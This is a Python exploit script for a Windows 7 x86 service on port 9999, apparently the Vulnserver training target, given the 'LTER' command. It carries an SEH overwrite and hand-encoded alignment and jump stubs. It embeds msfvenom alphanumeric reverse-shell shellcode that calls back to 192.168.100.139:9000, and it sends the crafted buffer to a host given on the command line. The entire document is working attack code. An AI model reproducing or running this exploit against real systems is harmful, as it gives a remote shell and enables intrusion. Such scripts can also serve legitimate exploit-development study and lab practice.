# Author: Felipe Winsnes (@whitecr0wz)
# Tested on Windows 7 (x86)

import socket, sys, struct

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.139 LPORT=9000 -f py -e x86/alpha_mixed BufferRegister=ESI EXITFUNC=thread > shellcode
# Payload size: 702 bytes

buf =  b""
buf += b"\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x39\x6c\x38\x68\x4e\x62\x35\x50\x77\x70\x33\x30\x51"
buf += b"\x70\x6b\x39\x68\x65\x66\x51\x79\x50\x53\x54\x6e\x6b"
buf += b"\x46\x30\x34\x70\x6e\x6b\x56\x32\x46\x6c\x4c\x4b\x46"
buf += b"\x32\x47\x64\x4c\x4b\x62\x52\x64\x68\x44\x4f\x6f\x47"
buf += b"\x32\x6a\x36\x46\x44\x71\x4b\x4f\x6c\x6c\x35\x6c\x51"
buf += b"\x71\x71\x6c\x77\x72\x54\x6c\x35\x70\x4f\x31\x38\x4f"
buf += b"\x74\x4d\x76\x61\x6b\x77\x4a\x42\x49\x62\x51\x42\x32"
buf += b"\x77\x6e\x6b\x76\x32\x54\x50\x6e\x6b\x50\x4a\x45\x6c"
buf += b"\x4c\x4b\x50\x4c\x52\x31\x43\x48\x5a\x43\x53\x78\x37"
buf += b"\x71\x48\x51\x36\x31\x6c\x4b\x51\x49\x61\x30\x37\x71"
buf += b"\x6e\x33\x6e\x6b\x50\x49\x46\x78\x6b\x53\x67\x4a\x37"
buf += b"\x39\x4e\x6b\x37\x44\x6c\x4b\x53\x31\x79\x46\x35\x61"
buf += b"\x6b\x4f\x4e\x4c\x59\x51\x5a\x6f\x36\x6d\x35\x51\x4b"
buf += b"\x77\x35\x68\x69\x70\x61\x65\x7a\x56\x43\x33\x63\x4d"
buf += b"\x6a\x58\x57\x4b\x51\x6d\x35\x74\x42\x55\x59\x74\x31"
buf += b"\x48\x6c\x4b\x36\x38\x61\x34\x66\x61\x6e\x33\x51\x76"
buf += b"\x6c\x4b\x64\x4c\x72\x6b\x4e\x6b\x50\x58\x45\x4c\x37"
buf += b"\x71\x39\x43\x4c\x4b\x33\x34\x6e\x6b\x37\x71\x78\x50"
buf += b"\x4c\x49\x43\x74\x34\x64\x56\x44\x43\x6b\x31\x4b\x61"
buf += b"\x71\x42\x79\x53\x6a\x72\x71\x39\x6f\x39\x70\x53\x6f"
buf += b"\x51\x4f\x73\x6a\x4e\x6b\x72\x32\x38\x6b\x4c\x4d\x63"
buf += b"\x6d\x52\x48\x77\x43\x34\x72\x57\x70\x33\x30\x61\x78"
buf += b"\x72\x57\x33\x43\x44\x72\x51\x4f\x66\x34\x71\x78\x72"
buf += b"\x6c\x43\x47\x74\x66\x77\x77\x39\x6f\x48\x55\x4d\x68"
buf += b"\x4e\x70\x46\x61\x55\x50\x47\x70\x64\x69\x38\x44\x72"
buf += b"\x74\x70\x50\x35\x38\x65\x79\x4f\x70\x32\x4b\x75\x50"
buf += b"\x4b\x4f\x5a\x75\x30\x50\x50\x50\x72\x70\x30\x50\x47"
buf += b"\x30\x36\x30\x73\x70\x50\x50\x52\x48\x68\x6a\x66\x6f"
buf += b"\x69\x4f\x39\x70\x69\x6f\x4e\x35\x6d\x47\x73\x5a\x45"
buf += b"\x55\x55\x38\x6f\x30\x4e\x48\x75\x34\x4e\x6b\x72\x48"
buf += b"\x67\x72\x75\x50\x77\x53\x65\x78\x6c\x49\x49\x76\x32"
buf += b"\x4a\x74\x50\x42\x76\x63\x67\x62\x48\x6f\x69\x6d\x75"
buf += b"\x30\x74\x71\x71\x59\x6f\x49\x45\x4e\x65\x4f\x30\x51"
buf += b"\x64\x66\x6c\x59\x6f\x30\x4e\x65\x58\x74\x35\x6a\x4c"
buf += b"\x43\x58\x4a\x50\x4e\x55\x79\x32\x70\x56\x49\x6f\x79"
buf += b"\x45\x75\x38\x61\x73\x72\x4d\x70\x64\x65\x50\x4d\x59"
buf += b"\x48\x63\x71\x47\x50\x57\x56\x37\x74\x71\x48\x76\x30"
buf += b"\x6a\x74\x52\x53\x69\x52\x76\x39\x72\x39\x6d\x70\x66"
buf += b"\x49\x57\x63\x74\x74\x64\x47\x4c\x75\x51\x33\x31\x4e"
buf += b"\x6d\x73\x74\x46\x44\x36\x70\x6f\x36\x37\x70\x72\x64"
buf += b"\x52\x74\x76\x30\x62\x76\x52\x76\x42\x76\x70\x46\x72"
buf += b"\x76\x32\x6e\x50\x56\x36\x36\x73\x63\x50\x56\x53\x58"
buf += b"\x71\x69\x5a\x6c\x77\x4f\x6c\x46\x49\x6f\x68\x55\x6f"
buf += b"\x79\x69\x70\x30\x4e\x63\x66\x50\x46\x6b\x4f\x30\x30"
buf += b"\x72\x48\x75\x58\x6f\x77\x77\x6d\x71\x70\x49\x6f\x6a"
buf += b"\x75\x6f\x4b\x39\x70\x65\x4d\x47\x5a\x44\x4a\x45\x38"
buf += b"\x4f\x56\x7a\x35\x6f\x4d\x4d\x4d\x49\x6f\x6b\x65\x77"
buf += b"\x4c\x74\x46\x63\x4c\x64\x4a\x4f\x70\x69\x6b\x4b\x50"
buf += b"\x54\x35\x55\x55\x6f\x4b\x57\x37\x64\x53\x51\x62\x52"
buf += b"\x4f\x30\x6a\x65\x50\x70\x53\x4b\x4f\x6b\x65\x41\x41"

nseh = struct.pack("<I", 0x04750674)
seh = struct.pack("<I", 0x6250172B)

alignment = ""
alignment += "\x54\x58\x5E"          # PUSH ESP, POP EAX, POP ESI
alignment += "\x66\x05\x4E\x13"      # ADD AX, 0x134E
alignment += "\x50\x5C"              # PUSH EAX, POP ESP

alignment2 = ""
alignment2 += "\x54\x58"             # PUSH ESP, POP EAX
alignment2 += "\x2C\x20"             # SUB AL, 0x20
alignment2 += "\x50\x5C"             # PUSH EAX, POP ESP

alignment3 = ""
alignment3 += "\x56\x5C"             # PUSH ESI, POP ESP # Sending ESP to its home
alignment3 += "\x53\x58"             # PUSH EBX, POP EAX # Cleaning EAX
alignment3 += "\x54\x58"             # PUSH ESP, POP EAX
alignment3 += "\x53\x5E"             # PUSH EBX, POP ESI # Cleaning ESI
alignment3 += "\x50\x5E"             # PUSH EAX, POP ESI
alignment3 += "\x66\x05\x8A\x01" * 6 # ADD AX, 0x18A
alignment3 += "\x66\x05\x7F\x01"     # ADD AX, 0x17F
alignment3 += "\x04\x11"             # ADD AL, 0x11
alignment3 += "\x50\x5E"             # PUSH EAX, POP ESI

jmp = ""
jmp += "\x25\x4A\x4D\x4E\x55"        ## and  eax, 0x554e4d4a
jmp += "\x25\x35\x32\x31\x2A"        ## and  eax, 0x2a313235
jmp += "\x05\x76\x40\x50\x50"        ## add  eax, 0x50504076
jmp += "\x05\x75\x40\x40\x40"        ## add  eax, 0x40404075
jmp += "\x50"                        ## push eax

# nasm > JMP -2700

sjmp = ""
sjmp += "\x25\x4A\x4D\x4E\x55"       ## and  eax, 0x554e4d4a
sjmp += "\x25\x35\x32\x31\x2A"       ## and  eax, 0x2a313235
sjmp += "\x05\x77\x41\x41\x41"       ## add  eax, 0x41414177
sjmp += "\x05\x66\x41\x41\x41"       ## add  eax, 0x41414166
sjmp += "\x05\x55\x41\x41\x41"       ## add  eax, 0x41414155
sjmp += "\x2D\x33\x33\x33\x33"       ## sub  eax, 0x33333333
sjmp += "\x50"                       ## push eax

sjmp += "\x25\x4A\x4D\x4E\x55"       ## and  eax, 0x554e4d4a
sjmp += "\x25\x35\x32\x31\x2A"       ## and  eax, 0x2a313235
sjmp += "\x05\x64\x37\x73\x77"       ## add  eax, 0x77733764
sjmp += "\x05\x54\x36\x63\x66"       ## add  eax, 0x66633654
sjmp += "\x05\x64\x35\x52\x55"       ## add  eax, 0x55523564
sjmp += "\x2D\x33\x33\x33\x33"       ## sub  eax, 0x33333333
sjmp += "\x50"                       ## push eax

buffer = "LTER /.:/" + "A" * 817 + alignment3 + "A" * 10 + buf + "\x47" * (2618 - len(alignment3) - 10 - len(buf)) + alignment2 + sjmp + "A" * (80 - len(alignment2) - len(sjmp))
buffer += nseh + seh + alignment + jmp
buffer += "A" * 800

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = sys.argv[1]

s.connect((host, 9999))

s.send(buffer)

s.close()
